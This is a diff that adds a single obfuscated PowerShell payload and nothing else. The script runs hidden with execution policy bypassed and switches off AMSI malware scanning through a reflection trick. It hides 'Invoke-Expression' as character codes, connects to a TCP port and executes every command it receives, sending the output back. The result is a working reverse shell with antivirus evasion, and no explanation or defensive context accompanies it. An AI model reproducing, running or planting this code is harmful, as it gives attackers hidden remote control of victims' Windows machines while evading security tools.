@@ -1,0 +1,31 @@
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$A='System.Management.Automation.AmsiUtils';
+$B=[Ref].Assembly.GetType($A);
+$B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+Function NCYKjCMr {
+    $LoEKUcps = New-Object System.Net.Sockets.TcpClient
+    try {
+        $LoEKUcps.Connect('localhost', 1443)
+    } catch {
+        return
+    }
+
+    $ympJDVVA = $LoEKUcps.GetStream()
+    $cPQKTTro = New-Object System.IO.StreamReader($ympJDVVA)
+    $AbPXdhkd = New-Object System.IO.StreamWriter($ympJDVVA)
+    $AbPXdhkd.AutoFlush = $true
+    $lxTcHjiO = ([char]73)+([char]110)+([char]118)+([char]111)+([char]107)+([char]101)+([char]45)+([char]69)+([char]120)+([char]112)+([char]114)+([char]101)+([char]115)+([char]115)+([char]105)+([char]111)+([char]110)
+
+    while ($true) {
+        $iznQEEBV = $cPQKTTro.ReadLine()
+        if (-not $iznQEEBV) { continue }
+        try {
+            $ptlimDzW = &$lxTcHjiO $iznQEEBV 2>&1 | Out-String
+        } catch {
+            $ptlimDzW = "ERROR: $_"
+        }
+        $ptlimDzW += "`nPS " + (pwd).Path + "> "
+        $AbPXdhkd.WriteLine($ptlimDzW)
+    }
+}
+NCYKjCMr"
